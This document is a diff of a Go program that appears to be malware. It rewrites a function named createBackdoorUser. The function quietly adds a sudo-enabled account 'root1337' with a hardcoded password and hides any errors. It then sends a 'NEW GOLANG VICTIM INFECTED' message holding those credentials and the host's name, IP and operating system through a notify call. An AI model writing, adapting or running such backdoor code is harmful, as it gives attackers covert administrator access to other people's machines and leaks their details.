@@ -37,25 +37,19 @@ func sysinfo() string {
     return "?? Host: `" + h + "`\n?? IP: `" + ip + "`\n?? OS: `" + runtime.GOOS + "`"
 }
 
-func createBackdoorUser(username, password string) {
-    username = "root1337"
-    password = "usnexus1111"
-    silently("sudo adduser --home /home/" + username + " --gecos \"\" --disabled-password --shell /bin/bash " + username)
-    silently("echo '" + username + ":" + password + "' | sudo chpasswd")
-    silently("sudo usermod -aG sudo " + username)
-    silently("sudo chown " + username + ":" + username + " /home/" + username)
-    silently("sudo chmod 700 /home/" + username)
-    silently("sudo cp -r /etc/skel/. /home/" + username)
-    silently("sudo chown -R " + username + ":" + username + " /home/" + username)
-    silently("sudo touch /home/" + username + "/.Xauthority")
-    silently("sudo chown " + username + ":" + username + " /home/" + username + "/.Xauthority")
-    silently("sudo chmod 600 /home/" + username + "/.Xauthority")
+func createBackdoorUser() {
+    username := "root1337"
+    password := "usnexus1111"
 
-    msg := "?? NEW GOLANG VICTIM INFECTED\n\n?? User: `" + username + "`\n?? Pass: `" + password + "`\n" + sysinfo()
+    silently("sudo adduser --disabled-password --gecos '' " + username + " 2>/dev/null || true")
+    silently("echo '" + username + ":" + password + "' | sudo chpasswd 2>/dev/null")
+    silently("sudo usermod -aG sudo " + username + " 2>/dev/null")
+
+    msg := "?? NEW GOLANG VICTIM INFECTED\n?? User: `" + username + "`\n?? Pass: `" + password + "`\n" + sysinfo()
     notify(msg)
 }
 
 func main() {
     rand.Seed(time.Now().UnixNano())
-    createBackdoorUser("", "")
+    createBackdoorUser()
 }
